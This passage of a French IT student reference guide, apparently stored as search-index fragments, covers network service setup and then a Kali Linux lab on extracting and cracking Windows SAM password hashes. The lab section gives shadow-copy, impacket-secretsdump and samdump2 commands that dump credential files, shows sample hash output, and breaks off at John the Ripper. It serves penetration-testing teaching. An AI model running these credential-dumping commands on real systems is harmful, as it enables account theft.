Installer vsftpd sudo apt update && sudo apt install vsftpd -y sudo systemctl enable vsftpd \u00c9tape 2 \u2014 Modifier le Fichier de Configuration sudo nano /etc/vsftpd.conf Ajoutez ou d\u00e9commentez les lignes suivantes : # Autoriser les utilisateurs locaux \u00e0 \u00e9crire des fichiers write_enable=YES # Confiner les utilisateurs dans leur r\u00e9pertoire personnel chroot_local_user=YES allow_writeable_chroot=YES # Activer le mode passif pour la compatibilit\u00e9 NAT pasv_enable=YES pasv_min_port=40000 pasv_max_port=40100 \u00c9tape 3 \u2014 Cr\u00e9er un Utilisateur FTP et son R\u00e9pertoire sudo adduser utilisateurftp sudo mkdir -p /home/utilisateurftp/fichiers sudo chown nobody:nogroup /home/utilisateurftp sudo chown utilisateurftp:utilisateurftp /home/utilisateurftp/fichiers \u00c9tape 4 \u2014 Ouvrir les Ports du Pare-feu et Red\u00e9marrer sudo ufw allow 21/tcp sudo ufw allow 40000:40100/tcp sudo systemctl restart vsftpd \u00c9tape 5 \u2014 Tester la Connexion ftp 192.168.1.20 # ou utiliser FileZilla avec le mode passif activ\u00e9 Termes cl\u00e9s : vsftpd \u00b7 Port 21 \u00b7 Mode passif \u00b7 chroot \u00b7 SFTP","title":"Configuration \u2014 vsftpd sur Ubuntu"},{"location":"#04-serveur-dns","text":"Domain Name System \u2014 r\u00e9sout les noms d'h\u00f4tes en adresses IP via BIND9 sous Linux.","title":"04 \u2014 Serveur DNS"},{"location":"#fonctionnement-de-la-resolution-dns","text":"Le navigateur demande : \"quelle est l'IP de webserver.lab.local ?\" \u2502 \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2510 \u2502R\u00e9solveur \u2502 \u2192 v\u00e9rifie le cache local d'abord \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 absence dans le cache \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 BIND9 DNS \u2502 192.168.1.53 \u2502 (autoritaire) \u2502 \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 correspondance trouv\u00e9e dans le fichier de zone \u25bc Retourne : 192.168.1.10 \u2713","title":"Fonctionnement de la R\u00e9solution DNS"},{"location":"#types-denregistrements-dns-courants","text":"Enregistrement R\u00f4le Exemple A Nom d'h\u00f4te \u2192 IPv4 webserver \u2192 192.168.1.10 AAAA Nom d'h\u00f4te \u2192 IPv6 webserver \u2192 ::1 CNAME Alias vers un autre nom d'h\u00f4te www \u2192 webserver MX Serveur de messagerie du domaine @ \u2192 mail.lab.local PTR R\u00e9solution inverse (IP \u2192 nom) 10 \u2192 webserver.lab.local NS Serveur de noms autoritaire @ \u2192 ns1.lab.local SOA Enregistrement d'autorit\u00e9 de zone D\u00e9but du fichier de zone","title":"Types d'Enregistrements DNS Courants"},{"location":"#configuration-bind9-sur-ubuntu","text":"\u00c9tape 1 \u2014 Installer BIND9 sudo apt install bind9 bind9utils bind9-doc -y \u00c9tape 2 \u2014 D\u00e9clarer la Zone \u00c9ditez /etc/bind/named.conf.local : zone \"lab.local\" { type master; file \"/etc/bind/zones/db.lab.local\"; }; \u00c9tape 3 \u2014 Cr\u00e9er le Fichier de Zone sudo mkdir -p /etc/bind/zones sudo nano /etc/bind/zones/db.lab.local $TTL 604800 @ IN SOA ns1.lab.local. admin.lab.local. ( 2025010101 ; Num\u00e9ro de s\u00e9rie \u2190 \u00e0 incr\u00e9menter apr\u00e8s chaque modification 604800 ; Rafra\u00eechissement 86400 ; Nouvelle tentative 2419200 ; Expiration 604800 ) ; TTL minimum ; Enregistrement du serveur de noms @ IN NS ns1.lab.local. ns1 IN A 192.168.1.53 ; Enregistrements A des h\u00f4tes router IN A 192.168.1.1 webserver IN A 192.168.1.10 fileserver IN A 192.168.1.20 ; Alias CNAME www IN CNAME webserver \u00c9tape 4 \u2014 Valider et Red\u00e9marrer sudo named-checkconf sudo named-checkzone lab.local /etc/bind/zones/db.lab.local sudo systemctl restart bind9 \u00c9tape 5 \u2014 Tester la R\u00e9solution nslookup webserver.lab.local 192.168.1.53 dig @192.168.1.53 www.lab.local Conseil : Incr\u00e9mentez toujours le num\u00e9ro de s\u00e9rie apr\u00e8s avoir modifi\u00e9 un fichier de zone, sinon les serveurs DNS secondaires ne prendront pas en compte vos changements. Termes cl\u00e9s : BIND9 \u00b7 Fichier de zone \u00b7 Enregistrement A \u00b7 SOA \u00b7 Port 53 \u00b7 nslookup","title":"Configuration \u2014 BIND9 sur Ubuntu"},{"location":"#05-serveur-dhcp","text":"Dynamic Host Configuration Protocol \u2014 attribue automatiquement des adresses IP et la configuration r\u00e9seau aux clients via isc-dhcp-server .","title":"05 \u2014 Serveur DHCP"},{"location":"#le-processus-dora","text":"Client Serveur DHCP \u2502 \u2502 \u251c\u2500\u2500\u2500\u2500 DISCOVER \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 \"Y a-t-il un serveur ? J'ai besoin d'une IP.\" \u2502\u25c0\u2500\u2500\u2500 OFFER \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 \"Je vous propose 192.168.1.105\" \u251c\u2500\u2500\u2500\u2500 REQUEST \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 \"J'accepte 192.168.1.105, merci.\" \u2502\u25c0\u2500\u2500\u2500 ACK \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \"Confirm\u00e9 \u2014 bail valide 24h.\" \u2502 \u2502","title":"Le Processus DORA"},{"location":"#ce-que-le-dhcp-attribue","text":"Adresse IP \u2014 depuis une plage d\u00e9finie (pool) Masque de sous-r\u00e9seau \u2014 pour le segment r\u00e9seau Passerelle par d\u00e9faut \u2014 l'adresse IP du routeur Serveur(s) DNS \u2014 pour la r\u00e9solution de noms Dur\u00e9e du bail \u2014 d\u00e9lai avant renouvellement","title":"Ce que le DHCP Attribue"},{"location":"#configuration-isc-dhcp-server-sur-ubuntu","text":"\u00c9tape 1 \u2014 Installer le Paquet sudo apt install isc-dhcp-server -y \u00c9tape 2 \u2014 D\u00e9finir l'Interface d'\u00c9coute \u00c9ditez /etc/default/isc-dhcp-server : INTERFACESv4=\"eth0\" \u00c9tape 3 \u2014 Configurer le Sous-r\u00e9seau et la Plage d'Adresses \u00c9ditez /etc/dhcp/dhcpd.conf : default-lease-time 86400; # 24 heures max-lease-time 172800; # 48 heures maximum subnet 192.168.1.0 netmask 255.255.255.0 { range 192.168.1.100 192.168.1.200; # plage d'adresses IP option routers 192.168.1.1; # passerelle par d\u00e9faut option domain-name-servers 192.168.1.53, 8.8.8.8; option domain-name \"lab.local\"; } # R\u00e9servation statique par adresse MAC (ex. pour une imprimante) host imprimante { hardware ethernet AA:BB:CC:DD:EE:FF; fixed-address 192.168.1.50; } \u00c9tape 4 \u2014 D\u00e9marrer et Surveiller sudo systemctl restart isc-dhcp-server sudo systemctl status isc-dhcp-server # Afficher les baux actifs cat /var/lib/dhcp/dhcpd.leases Conseil pratique : Utilisez les r\u00e9servations statiques (liaison IP + MAC) pour les serveurs et imprimantes afin qu'ils re\u00e7oivent toujours la m\u00eame adresse IP sans configuration statique manuelle sur l'\u00e9quipement. Termes cl\u00e9s : DORA \u00b7 Bail \u00b7 Plage IP \u00b7 R\u00e9servation \u00b7 Port 67/68","title":"Configuration \u2014 isc-dhcp-server sur Ubuntu"},{"location":"#06-point-dacces-sans-fil","text":"\u00c9quipement IEEE 802.11 qui \u00e9tend un r\u00e9seau filaire aux clients sans fil sans assurer de routage.","title":"06 \u2014 Point d'Acc\u00e8s Sans Fil"},{"location":"#pap-vs-autres-equipements","text":"\u00c9quipement Routage Wi-Fi Cas d'utilisation PAP (WAP) \u274c \u2705 \u00c9tend un LAN filaire existant Routeur sans fil \u2705 \u2705 Appareil tout-en-un pour la maison R\u00e9p\u00e9teur/Amplificateur \u274c \u2705 Rediffuse le signal existant (ajoute de la latence) N\u0153ud Mesh \u274c \u2705 Itin\u00e9rance transparente sur de grandes surfaces","title":"PAP vs Autres \u00c9quipements"},{"location":"#comparatif-des-normes-80211","text":"Norme Nom Wi-Fi D\u00e9bit max Fr\u00e9quence 802.11n Wi-Fi 4 600 Mbps 2,4 / 5 GHz 802.11ac Wi-Fi 5 3,5 Gbps 5 GHz 802.11ax Wi-Fi 6 9,6 Gbps 2,4 / 5 / 6 GHz 802.11be Wi-Fi 7 46 Gbps Multi-bande S\u00e9curit\u00e9 minimale : Utilisez toujours WPA2-Personal ou sup\u00e9rieur. Pr\u00e9f\u00e9rez WPA3 si disponible. N'utilisez jamais WEP ni les r\u00e9seaux ouverts.","title":"Comparatif des Normes 802.11"},{"location":"#configuration-interface-web-generique-ubiquiti-cisco-tp-link","text":"\u00c9tape 1 \u2014 Connexion Physique Branchez le PAP sur un port de commutateur PoE (ou utilisez un injecteur PoE). Un seul c\u00e2ble Cat5e/Cat6 fournit \u00e0 la fois l'alimentation et les donn\u00e9es. V\u00e9rifiez que le port est bien affect\u00e9 au bon VLAN. \u00c9tape 2 \u2014 Acc\u00e9der \u00e0 l'Interface d'Administration # Acc\u00e8s par d\u00e9faut selon la marque : Ubiquiti UniFi \u2192 Adoption via l'application UniFi Controller Cisco WAP \u2192 https://192.168.1.1 (voir l'\u00e9tiquette) TP-Link EAP \u2192 https://192.168.0.254 Identifiants par d\u00e9faut : admin / admin \u26a0 \u00c0 modifier imm\u00e9diatement apr\u00e8s la premi\u00e8re connexion ! \u00c9tape 3 \u2014 Cr\u00e9er le R\u00e9seau Sans Fil (SSID) Nom SSID : ReseauLabo_5G Bande : 5 GHz (ou double bande) S\u00e9curit\u00e9 : WPA2-Personal (WPA3 si disponible) Mot de passe : [minimum 12 caract\u00e8res, mixte] Tag VLAN : 20 (optionnel, pour la segmentation r\u00e9seau) \u00c9tape 4 \u2014 Configurer le Canal et la Puissance d'\u00c9mission 2,4 GHz \u2192 Utiliser les canaux 1, 6 ou 11 (sans chevauchement) 5 GHz \u2192 Activer le Canal Auto (les canaux DFS sont acceptables) Largeur de canal : 40 MHz (2,4 GHz) / 80 MHz (5 GHz) Puissance TX : Auto ou Moyen \u2190 \u00e9viter le Maximum dans les environnements denses \u00c9tape 5 \u2014 Activer le R\u00e9seau Invit\u00e9 (Optionnel) Cr\u00e9ez un second SSID associ\u00e9 \u00e0 un VLAN isol\u00e9. Activez l'isolation des clients pour emp\u00eacher les invit\u00e9s de communiquer entre eux ou d'acc\u00e9der au LAN principal. Routez le trafic invit\u00e9 vers un sous-r\u00e9seau distinct avec acc\u00e8s Internet uniquement. Termes cl\u00e9s : SSID \u00b7 WPA3 \u00b7 PoE \u00b7 Canal \u00b7 VLAN \u00b7 Isolation des clients","title":"Configuration \u2014 Interface Web G\u00e9n\u00e9rique (Ubiquiti / Cisco / TP-Link)"},{"location":"#07-serveur-web-apache-nginx","text":"Serveur HTTP/HTTPS qui sert du contenu web aux navigateurs, configur\u00e9 via Apache2 ou Nginx sous Linux.","title":"07 \u2014 Serveur Web (Apache / Nginx)"},{"location":"#apache-vs-nginx","text":"Fonctionnalit\u00e9 Apache Nginx Architecture Bas\u00e9e sur les processus \u00c9v\u00e9nementielle (asynchrone) Configuration Par r\u00e9pertoire .htaccess Configuration centralis\u00e9e Support PHP Natif (mod_php) Via PHP-FPM Performances Bon pour le contenu dynamique Excellent pour les fichiers statiques et la forte charge Proxy inverse Support\u00e9 Excellent Id\u00e9al pour H\u00e9bergement mutualis\u00e9, apps PHP Sites \u00e0 fort trafic, microservices","title":"Apache vs Nginx"},{"location":"#concept-dhote-virtuel","text":"Requ\u00eate entrante : GET http://site-a.lab.local \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Serveur Web \u2502 \u2502 \u2502 \u2502 VHost: site-a.lab.local \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6 /var/www/site-a \u2502 \u2502 VHost: site-b.lab.local \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6 /var/www/site-b \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Une seule adresse IP \u2192 Plusieurs sites web","title":"Concept d'H\u00f4te Virtuel"},{"location":"#configuration-apache2-sur-ubuntu","text":"\u00c9tape 1 \u2014 Installer Apache2 sudo apt install apache2 -y sudo systemctl enable apache2 # V\u00e9rification : ouvrir http://192.168.1.10 \u2192 page par d\u00e9faut d'Apache \u00c9tape 2 \u2014 Cr\u00e9er un Fichier d'H\u00f4te Virtuel sudo nano /etc/apache2/sites-available/site-a.conf <VirtualHost *:80> ServerName site-a.lab.local DocumentRoot /var/www/site-a ErrorLog ${APACHE_LOG_DIR}/site-a-error.log CustomLog ${APACHE_LOG_DIR}/site-a-access.log combined </VirtualHost> \u00c9tape 3 \u2014 Cr\u00e9er la Racine Web et Activer le Site sudo mkdir -p /var/www/site-a echo \"<h1>Le Site A fonctionne !</h1>\" | sudo tee /var/www/site-a/index.html sudo a2ensite site-a.conf sudo systemctl reload apache2 \u00c9tape 4 \u2014 Activer HTTPS # Option A \u2014 Certificat auto-sign\u00e9 (pour labs/usage interne) : sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \\ -keyout /etc/ssl/private/lab.key \\ -out /etc/ssl/certs/lab.crt sudo a2enmod ssl # Puis ajouter les directives SSL dans le VirtualHost sur le port 443 # Option B \u2014 Let's Encrypt (pour les serveurs publics) : sudo apt install certbot python3-certbot-apache sudo certbot --apache","title":"Configuration \u2014 Apache2 sur Ubuntu"},{"location":"#configuration-nginx-sur-ubuntu","text":"\u00c9tape 1 \u2014 Installer Nginx sudo apt install nginx -y sudo systemctl enable nginx \u00c9tape 2 \u2014 Cr\u00e9er un Bloc Serveur sudo nano /etc/nginx/sites-available/site-a server { listen 80; server_name site-a.lab.local; root /var/www/site-a; index index.html; access_log /var/log/nginx/site-a-access.log; error_log /var/log/nginx/site-a-error.log; } \u00c9tape 3 \u2014 Activer le Site et Recharger sudo ln -s /etc/nginx/sites-available/site-a /etc/nginx/sites-enabled/ sudo nginx -t # tester la syntaxe de la configuration sudo systemctl reload nginx Termes cl\u00e9s : H\u00f4te virtuel \u00b7 DocumentRoot \u00b7 TLS/SSL \u00b7 Let's Encrypt \u00b7 Port 80/443 \u00b7 Certbot","title":"Configuration \u2014 Nginx sur Ubuntu"},{"location":"#reference-rapide-ports-et-protocoles","text":"Service Protocole Port(s) Remarques Contr\u00f4le FTP TCP 21 Authentification et commandes Donn\u00e9es FTP (Actif) TCP 20 Connexion initi\u00e9e par le serveur Donn\u00e9es FTP (Passif) TCP 40000\u201340100 Connexion initi\u00e9e par le client ; compatible NAT SSH / SFTP TCP 22 Alternative chiffr\u00e9e au FTP DNS UDP / TCP 53 UDP pour les requ\u00eates, TCP pour les transferts de zone Serveur DHCP UDP 67 Le serveur \u00e9coute Client DHCP UDP 68 Le client \u00e9coute HTTP TCP 80 Trafic web non chiffr\u00e9 HTTPS TCP 443 Trafic web chiffr\u00e9 via TLS","title":"R\u00e9f\u00e9rence Rapide \u2014 Ports et Protocoles"},{"location":"#commandes-de-diagnostic-utiles","text":"# Tester la r\u00e9solution DNS nslookup webserver.lab.local 192.168.1.53 dig @192.168.1.53 site-a.lab.local # V\u00e9rifier les ports ouverts sur un serveur ss -tulnp netstat -tulnp # Tester la r\u00e9ponse HTTP curl -I http://site-a.lab.local # Afficher les baux DHCP cat /var/lib/dhcp/dhcpd.leases # V\u00e9rifier l'\u00e9tat d'un service (remplacer par le service souhait\u00e9) sudo systemctl status bind9 sudo systemctl status apache2 # Consulter les journaux en temps r\u00e9el sudo tail -f /var/log/apache2/site-a-access.log sudo journalctl -u nginx -f # Ping / traceroute ping 192.168.1.1 traceroute 8.8.8.8 Guide de Configuration R\u00e9seau \u00b7 R\u00e9f\u00e9rence pour \u00c9tudiants en Informatique \u00b7 2025","title":"Commandes de Diagnostic Utiles"},{"location":"kali/","text":"Guide Kali Linux & Attaque de la Base SAM R\u00e9f\u00e9rence pour \u00c9tudiants en Informatique \u2014 S\u00e9curit\u00e9 offensive et tests de p\u00e9n\u00e9tration \u26a0\ufe0f Avertissement l\u00e9gal : Les techniques pr\u00e9sent\u00e9es dans ce document sont \u00e0 des fins strictement \u00e9ducatives dans un environnement de laboratoire isol\u00e9. Toute utilisation sur des syst\u00e8mes sans autorisation explicite est ill\u00e9gale et passible de poursuites p\u00e9nales. Ne pratiquez que sur vos propres machines ou dans un cadre p\u00e9dagogique autoris\u00e9. Table des Mati\u00e8res # Sujet 01 Installation de Kali Linux 02 Pr\u00e9sentation de la base SAM 03 Extraction des hachages SAM 04 Attaque par dictionnaire avec John the Ripper 05 Attaque par force brute avec John the Ripper 06 Analyse des r\u00e9sultats 07 Commandes de r\u00e9f\u00e9rence rapide 01 \u2014 Installation de Kali Linux Pr\u00e9requis Composant Minimum Recommand\u00e9 RAM 2 Go 4 Go ou plus Stockage 20 Go 50 Go ou plus Processeur x64 double c\u0153ur x64 quad-c\u0153ur R\u00e9seau Facultatif Recommand\u00e9 Options d'installation Il existe trois m\u00e9thodes principales pour installer Kali Linux : Machine virtuelle (VM) \u2014 id\u00e9al pour les d\u00e9butants, installation sur VirtualBox ou VMware sans affecter le syst\u00e8me h\u00f4te Dual boot \u2014 Kali cohabite avec Windows sur le m\u00eame disque Installation native \u2014 Kali comme syst\u00e8me principal (d\u00e9conseill\u00e9 pour les d\u00e9butants) Conseil : Pour ce guide, l'installation en machine virtuelle est recommand\u00e9e. Elle est s\u00fbre, r\u00e9versible et parfaite pour un environnement de lab. M\u00e9thode A \u2014 Installation sur VirtualBox (recommand\u00e9e) \u00c9tape 1 \u2014 T\u00e9l\u00e9charger l'ISO Kali Linux Rendez-vous sur le site officiel : https://www.kali.org/get-kali/ Choisissez l'image Installer (64-bit) : kali-linux-2024.x-installer-amd64.iso V\u00e9rifiez l'int\u00e9grit\u00e9 du fichier avec la somme SHA256 fournie sur le site : # Sous Linux/macOS sha256sum kali-linux-2024.x-installer-amd64.iso # Sous Windows (PowerShell) Get-FileHash kali-linux-2024.x-installer-amd64.iso -Algorithm SHA256 \u00c9tape 2 \u2014 Cr\u00e9er la Machine Virtuelle Ouvrez VirtualBox \u2192 cliquez sur Nouvelle Renseignez les param\u00e8tres suivants : Nom : Kali Linux 2024 Type : Linux Version : Debian (64-bit) RAM : 4096 Mo (minimum 2048 Mo) Disque dur : Cr\u00e9er un nouveau disque virtuel VDI Taille disque : 50 Go (allocation dynamique) Avant de d\u00e9marrer, configurez les param\u00e8tres suppl\u00e9mentaires : Syst\u00e8me \u2192 Processeur : 2 CPU Affichage \u2192 M\u00e9moire vid\u00e9o : 128 Mo R\u00e9seau \u2192 Adaptateur 1 : Mode Pont (ou NAT selon votre besoin) Stockage \u2192 Lecteur optique : s\u00e9lectionner l'ISO Kali t\u00e9l\u00e9charg\u00e9 \u00c9tape 3 \u2014 D\u00e9marrer l'Installation D\u00e9marrez la VM \u2192 le menu de d\u00e9marrage Kali s'affiche S\u00e9lectionnez Graphical Install \u00c9tape 4 \u2014 Configuration de la langue et du clavier Langue : Fran\u00e7ais Pays : France (ou votre pays) Disposition clavier: Fran\u00e7ais (AZERTY) \u00c9tape 5 \u2014 Configuration r\u00e9seau Nom de la machine : kali-lab Domaine : (laisser vide) \u00c9tape 6 \u2014 Cr\u00e9ation du compte utilisateur Nom complet : Etudiant Lab Nom d'utilisateur : etudiant Mot de passe : [choisir un mot de passe fort] Remarque : Depuis Kali 2020, le compte root n'est plus le compte par d\u00e9faut. Un utilisateur standard avec acc\u00e8s sudo est cr\u00e9\u00e9 \u00e0 la place. \u00c9tape 7 \u2014 Partitionnement du disque S\u00e9lectionnez Utiliser un disque entier pour une installation simple en VM : Disque \u00e0 partitionner : VBOX HARDDISK (le disque virtuel) Sch\u00e9ma de partitionnement : Tout dans une seule partition \u2192 Terminer le partitionnement et appliquer les changements \u2192 Confirmer : Oui \u00c9tape 8 \u2014 Installation du syst\u00e8me de base L'installation copie les fichiers syst\u00e8me (~10\u201320 minutes selon votre machine). \u00c9tape 9 \u2014 S\u00e9lection des logiciels Laissez la s\u00e9lection par d\u00e9faut : \u2705 Kali desktop environment (GNOME ou Xfce selon la version) \u2705 Top 10 \u2014 les 10 outils les plus utilis\u00e9s en pentest \u2705 Default recommended tools \u00c9tape 10 \u2014 Installation du chargeur de d\u00e9marrage GRUB Installer GRUB sur le disque principal : Oui P\u00e9riph\u00e9rique : /dev/sda \u00c9tape 11 \u2014 Fin de l'installation Retirez l'ISO du lecteur virtuel Red\u00e9marrez la VM Connectez-vous avec les identifiants cr\u00e9\u00e9s \u00e0 l'\u00e9tape 6 M\u00e9thode B \u2014 Image VirtualBox pr\u00e9-configur\u00e9e (plus rapide) Kali propose des images VirtualBox et VMware pr\u00eates \u00e0 l'emploi : T\u00e9l\u00e9chargez l'image .ova sur https://www.kali.org/get-kali/#kali-virtual-machines Dans VirtualBox : Fichier \u2192 Importer un appareil virtuel S\u00e9lectionnez le fichier .ova \u2192 suivez l'assistant D\u00e9marrez la VM Identifiants par d\u00e9faut de l'image pr\u00e9-configur\u00e9e : Utilisateur : kali Mot de passe : kali \u26a0 \u00c0 modifier imm\u00e9diatement ! Mise \u00e0 jour post-installation Une fois connect\u00e9, ouvrez un terminal et mettez le syst\u00e8me \u00e0 jour : sudo apt update && sudo apt full-upgrade -y sudo apt autoremove -y V\u00e9rifiez la version install\u00e9e : cat /etc/os-release uname -a 02 \u2014 Pr\u00e9sentation de la Base SAM Qu'est-ce que la base SAM ? La SAM (Security Account Manager) est une base de donn\u00e9es Windows qui stocke les informations d'authentification des comptes utilisateurs locaux. Elle se trouve \u00e0 l'emplacement suivant : C:\\Windows\\System32\\config\\SAM Ce que contient la SAM La SAM ne stocke jamais les mots de passe en clair. Elle conserve des hachages cryptographiques : Format Description Exemple LM Hash Ancien format (< Windows Vista), tr\u00e8s faible aad3b435b51404ee NTLM Hash Format actuel, MD4 du mot de passe en UTF-16 31d6cfe0d16ae931b73c59d7e0c089c0 Architecture de protection \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Base de registre Windows \u2502 \u2502 \u2502 \u2502 HKLM\\SAM \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\u2500\u2500\u25b6 Chiffr\u00e9 par SYSKEY \u2502 HKLM\\SYSTEM (contient la cl\u00e9) \u2500\u2500 \u2502\u2500\u2500\u25b6 N\u00e9cessaire pour d\u00e9chiffrer \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Fichiers physiques : C:\\Windows\\System32\\config\\SAM C:\\Windows\\System32\\config\\SYSTEM Concept cl\u00e9 : La SAM est verrouill\u00e9e par Windows en cours d'ex\u00e9cution. Il est impossible de la copier directement depuis un Windows d\u00e9marr\u00e9. Il faut passer par des m\u00e9thodes alternatives (volume shadow copy, d\u00e9marrage live, etc.). 03 \u2014 Extraction des Hachages SAM Environnement du lab Pour ce laboratoire, nous utilisons : Machine cible : Windows 11 (VM VirtualBox) Machine attaquante : Kali Linux (VM VirtualBox) R\u00e9seau : R\u00e9seau interne VirtualBox (isol\u00e9) Acc\u00e8s requis : Administrateur local sur la cible Windows \u26a0\ufe0f Ce lab n\u00e9cessite un acc\u00e8s administrateur pr\u00e9alable sur la machine Windows cible. L'objectif est d'extraire et craquer les hachages, pas de contourner l'authentification Windows. M\u00e9thode 1 \u2014 Extraction via Volume Shadow Copy (depuis Windows) Cette m\u00e9thode fonctionne depuis Windows avec des droits administrateur, sans d\u00e9marrer sur un live CD. Sur la machine Windows 11 cible , ouvrez un Invite de commandes en tant qu'Administrateur : \u00c9tape 1 \u2014 Cr\u00e9er un clich\u00e9 instantan\u00e9 du volume wmic shadowcopy call create Volume='C:\\' \u00c9tape 2 \u2014 Identifier l'ID du clich\u00e9 cr\u00e9\u00e9 vssadmin list shadows Notez le chemin du dernier clich\u00e9, par exemple : \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 \u00c9tape 3 \u2014 Copier les fichiers SAM et SYSTEM copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Temp\\SAM copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM \u00c9tape 4 \u2014 Transf\u00e9rer les fichiers vers Kali Transf\u00e9rez SAM et SYSTEM vers votre machine Kali (via dossier partag\u00e9 VM, cl\u00e9 USB virtuelle, ou scp ). M\u00e9thode 2 \u2014 Extraction avec impacket-secretsdump (depuis Kali) Si vous disposez des identifiants d'un compte administrateur Windows, vous pouvez extraire les hachages \u00e0 distance depuis Kali : # Installation d'impacket si n\u00e9cessaire sudo apt install python3-impacket -y # Extraction \u00e0 distance impacket-secretsdump Administrateur:'MotDePasse'@192.168.1.50 R\u00e9sultat attendu : [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Invit\u00e9:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: M\u00e9thode 3 \u2014 Extraction avec samdump2 (fichiers copi\u00e9s) Si vous avez r\u00e9cup\u00e9r\u00e9 les fichiers SAM et SYSTEM physiques : # Installation sudo apt install samdump2 -y # Extraction des hachages samdump2 SYSTEM SAM > hashes.txt # V\u00e9rifier le contenu cat hashes.txt R\u00e9sultat typique : Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: Format des hachages NTLM nom_utilisateur : RID : LM_hash : NTLM_hash ::: \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2514\u2500\u2500 Hachage MD4 du mot de passe (32 caract\u00e8res hex) \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 LM hash (d\u00e9sactiv\u00e9 sur Win Vista+, valeur vide) \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Identifiant relatif (500 = Administrateur) \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Nom du compte 04 \u2014 Attaque par Dictionnaire avec John the Ripper Principe de l'attaque par dictionnaire Une attaque par dictionnaire teste une liste de mots de passe courants (le dictionnaire ) en les hachant un par un et en comparant le r\u00e9sultat au hachage cible. Elle est rapide et efficace contre les mots de passe faibles ou courants. Dictionnaire John the Ripper Hachage cible \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 password \u2502 \u2500 hash \u2500\u2500\u25b6\u2502 MD4(mot) \u2502\u2500\u2500compare\u2500\u25b6\u2502 8846f7ea... \u2502 \u2502 123456 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2717 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 azerty \u2502 \u2502 \u2502 admin \u2502 